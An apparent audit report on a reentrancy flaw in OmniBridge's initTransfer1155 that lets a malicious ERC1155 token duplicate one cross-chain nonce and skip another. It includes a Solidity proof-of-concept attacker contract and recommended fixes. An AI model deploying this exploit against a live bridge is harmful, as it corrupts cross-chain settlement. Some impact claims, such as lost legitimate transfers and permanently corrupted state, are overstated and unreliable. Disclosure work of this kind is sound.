### Title
Reentrancy via ERC1155 `safeTransferFrom` Callback in `initTransfer1155` Causes Nonce Duplication and Cross-Chain Settlement Corruption — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` at the top of the function, then makes an external call to an attacker-controlled ERC1155 contract via `safeTransferFrom`. Because ERC1155's `safeTransferFrom` triggers `onERC1155Received` callbacks, a malicious ERC1155 can re-enter `initTransfer1155` before the outer call reads `currentOriginNonce` for its `initTransferExtension` and `emit`. This causes the outer call to emit an `InitTransfer` event with the same nonce as the inner call — producing a duplicate cross-chain settlement message — while the original nonce is permanently skipped.

---

### Finding Description

`initTransfer1155` follows this sequence:

1. `currentOriginNonce += 1` (storage write, nonce = N)
2. `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to attacker-controlled address**
3. `initTransferExtension(..., currentOriginNonce, ...)` — reads `currentOriginNonce` from storage
4. `emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)` — reads `currentOriginNonce` from storage [1](#0-0) 

Steps 3 and 4 read `currentOriginNonce` **after** the external call at step 2. There is no `nonReentrant` guard on this function. [2](#0-1) 

A malicious ERC1155 contract can implement `safeTransferFrom` to re-enter `initTransfer1155` before returning. During re-entry:

- `currentOriginNonce` increments again to N+1
- The inner call completes: `initTransferExtension` and `emit` fire with nonce **N+1**
- Control returns to the outer call
- The outer call reads `currentOriginNonce` — now **N+1** — and calls `initTransferExtension` and `emit` again with nonce **N+1**

Result: nonce N is never emitted; nonce N+1 is emitted **twice**.

In `OmniBridgeWormhole`, `initTransferExtension` publishes a Wormhole VAA. Two VAAs with identical `originNonce=N+1` are published to the Wormhole guardian network. [3](#0-2) 

---

### Impact Explanation

Two `InitTransfer` Wormhole messages with the same `originNonce` are published. The NEAR side processes the first and, depending on its deduplication logic, may process the second as well — producing double-credit (unbacked token release on NEAR). Even if NEAR deduplicates by nonce, nonce N is permanently skipped: any legitimate transfer that was assigned nonce N is silently lost, constituting an irreversible fund lock for that user. The `currentOriginNonce` storage variable is permanently corrupted for all subsequent bridge users.

This matches: **High — Replayable, non-unique, or duplicate cross-chain settlement across nonce domains that produces double-credit or unbacked supply.**

---

### Likelihood Explanation

The attacker is fully unprivileged. `initTransfer1155` accepts any `tokenAddress` from the caller — no registration or admin approval is required. The attacker deploys a malicious ERC1155 contract and calls `initTransfer1155` directly. No leaked keys, no privileged roles, no external dependency compromise is needed. [4](#0-3) 

---

### Recommendation

Apply OpenZeppelin's `ReentrancyGuardUpgradeable` and add the `nonReentrant` modifier to both `initTransfer1155` and `initTransfer`. Alternatively, follow the checks-effects-interactions pattern by capturing the nonce value into a local variable **before** the external call and using that local variable in `initTransferExtension` and `emit`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 is IERC1155Receiver {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    // Called by OmniBridge.initTransfer1155 as safeTransferFrom
    function safeTransferFrom(
        address, address, uint256, uint256, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Re-enter: currentOriginNonce increments to N+1
            // Inner call emits InitTransfer with nonce N+1
            bridge.initTransfer1155(address(this), 1, 1, 0, 0, "near:victim.near", "");
        }
        // Outer call resumes: currentOriginNonce is now N+1
        // Outer call also emits InitTransfer with nonce N+1 (DUPLICATE)
        // Nonce N is permanently skipped
    }

    // Satisfy IERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function onERC1155Received(address,address,uint256,uint256,bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }
    function onERC1155BatchReceived(address,address,uint256[] calldata,uint256[] calldata,bytes calldata) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }

    function attack() external payable {
        // First call: currentOriginNonce → N, then re-enters → N+1
        // Both outer and inner emit InitTransfer with nonce N+1
        bridge.initTransfer1155{value: msg.value}(address(this), 1, 1, 0, 0, "near:victim.near", "");
    }
}
```

After `attack()`:
- `currentOriginNonce` = N+1
- Two `InitTransfer` events emitted with `originNonce = N+1`
- Two Wormhole VAAs published with `originNonce = N+1`
- Nonce N never appears in any event or VAA
